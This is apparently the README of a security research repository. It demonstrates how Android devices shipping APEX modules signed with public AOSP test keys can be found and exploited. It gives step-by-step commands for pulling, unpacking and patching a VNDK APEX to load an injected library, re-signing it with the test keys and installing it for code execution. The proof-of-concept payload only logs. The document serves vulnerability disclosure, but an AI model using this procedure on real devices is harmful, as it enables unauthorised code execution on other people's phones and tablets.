This directory contains a set of tools, prebuilts and artifacts that
demonstrate how to find and exploit Android devices that ship [APEXes][apex]
signed with test keys from AOSP. See the accompanying writeup for full details
of the issue.

[apex]: https://source.android.com/docs/core/ota/apex

## Files

- **`apex-checker/`**: A set of Bash scripts to save digests of known test keys
  and check APEXes en masse for signatures from those keys.
- **`apex-forger/`**: Lightweight wrappers around AOSP's `apexer` and
  `deapexer` tools that make it easy to unpack, modify, and repack an APEX.
  Like [apktool][apktool] for APEXes.
- **`vndk-libt/`**: Source code for a library we added to a vulnerable APEX to
  prove we can get code execution. All it does it print the command line of
  each process that loads it to logcat.
- **`output/`**: Results of the tools above so you don't have to build the
  entire exploit yourself. Includes apex-checker results for many devices, a
  prebuilt proof-of-concept APEX, and log files from a vulnerable device
  running that APEX.

[apktool]: https://apktool.org/

## Running the exploit (the easy way)

1. Obtain a [Lenovo Tab M10 Plus (Gen 3, Wi-Fi)][lenovo-tb125fu] tablet. A
   different device running Android 13 with `ro.vndk.version=31` might also
   work, but that's the only one we've tested.
2. Install all OTAs so the device is fully patched, then enable ADB.
3. Run `adb install output/lenovo-tb125fu/com.android.vndk.v31/forged.apex`.
4. Run `adb reboot && adb logcat -s RTXPoC:D`.
5. Observe numerous `RTXPoC` log messages, each from a process we can execute
   code in.

[lenovo-tb125fu]: https://www.lenovo.com/us/en/p/tablets/android-tablets/lenovo-tab-series/tab-m10-plus-gen-3/len103l0010

## Running the exploit (the hard way)

1. Clone a recent AOSP source tree (Android 13-ish), [envsetup+lunch][aosp-env],
   and run `m apexer deapexer apksigner` to build the needed tools.
2. Update `envsetup.sh` (the one here, not the one in AOSP) to point `$AOSP`
   and `$ANDROID_HOST_OUT` to the appropriate places.
3. Obtain any Android device. Update it and enable ADB.
4. Run `adb shell getprop ro.build.version.sdk` and `adb shell getprop ro.vndk.version`.
5. If the two match, `adb pull /system/apex/com.android.vndk.current.apex vndk.apex`.
   If not, `adb pull /system_ext/apex/com.android.vndk.v<NN>.apex vndk.apex`,
   where `<NN>` is `ro.vndk.version`.
6. Check if the APEX is vulnerable with `apex-checker/check.sh vndk.apex`. If
   the output doesn't start with "OI" (indicating both the outer and the inner
   signatures are from test keys), the device cannot be exploited.
7. Unpack the APEX with `apex-forger/unpack.sh vndk.apex vndk`.
8. Try patching `libutils.so` in the extracted APEX to load our injected
   `libt.so`: `git apply --directory=vndk vndk-libt/libutils-v31.patch`. If
   that doesn't work (e.g. different VNDK version), use a hex editor to
   manually change `libc.so` to `libt.so` in the appropriate `DT_NEEDED` of
   `vndk/payload/lib64/libutils.so`.
9. Build `libt.so` by running `ndk-build` inside `vndk-libt/`. Copy
   `vndk-libt/libs/arm64-v8a/libt.so` to `vndk/payload/lib64/libt.so`.
10. Extract `canned_fs_config` from `apex_build_info.bp`. There's no tool to do
    this easily: the closest is `protoc --decode_raw <vndk/apex_build_info.bp`
    followed by manually unescaping field #3. You can maybe just use the one in
    `output/lenovo-tb125fu/com.android.vndk.v31/`, but no promises. Place
    `canned_fs_config` in `vndk/`.
11. Add a line to `canned_fs_config`, like all the others, for `/lib64/libt.so`.
12. Download the test keys for the appropriate VNDK version from [here][keys].
13. Repack the APEX with `apex-forger/repack.sh vndk com.android.vndk.v<NN>.{pem,pubkey,pk8,x509.pem}`.
14. Run `adb install vndk/forged.apex`.
15. Run `adb reboot && adb logcat -s RTXPoC:D`.
16. Observe numerous `RTXPoC` log messages, each from a process we can execute
    code in.

[aosp-env]: https://source.android.com/docs/setup/build/building
[keys]: https://cs.android.com/android/_/android/platform/packages/modules/vndk/+/main:apex/;drc=4d6ae44d7fb64689e28c1dea9957269160eb2d97

## Test keys known to apex-checker

- com.android.appsearch
- com.android.art
- com.android.btservices
- com.android.i18n
- com.android.mediaprovider
- com.android.ondevicepersonalization
- com.android.permission
- com.android.rkpd
- com.android.runtime
- com.android.uwb
- com.android.virt
- com.android.vndk.v28
- com.android.vndk.v29
- com.android.vndk.v30
- com.android.vndk.v31
- com.android.vndk.v32
- com.android.vndk.v33
- com.android.wifi
